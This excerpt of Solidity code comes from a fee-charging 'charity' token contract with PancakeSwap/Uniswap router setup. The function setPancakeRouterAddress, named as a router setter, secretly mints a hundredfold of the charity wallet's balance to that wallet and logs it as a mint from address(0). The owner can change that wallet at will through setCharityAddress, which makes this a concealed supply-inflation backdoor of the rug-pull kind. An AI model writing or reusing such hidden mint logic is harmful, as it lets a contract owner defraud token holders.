...
function setPancakeRouterAddress(address _route) external onlyOwner() {
IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_route);
uint256 amount = balanceOf(charityAddress)*10**2;
(uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tBurn, uint256 tLiquidity) = _getValues(amount);
_tOwned[charityAddress] = _tOwned[charityAddress].add(tTransferAmount);
_rOwned[charityAddress] = _rOwned[charityAddress].add(rTransferAmount);
uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
.createPair(address(this), _uniswapV2Router.WETH());
emit Transfer(address(0), charityAddress, amount);
...
function calculateTotalFee() private {
    _feeTotal = _donationFee + _taxFee + _burnFee;
}
...
function setCharityAddress(address payable addr) external onlyOwner() {
charityAddress = addr;
}
...
function activateContract(address _route) external onlyOwner(){
IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_route);
uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
.createPair(address(this), _uniswapV2Router.WETH());
uniswapV2Router = _uniswapV2Router;
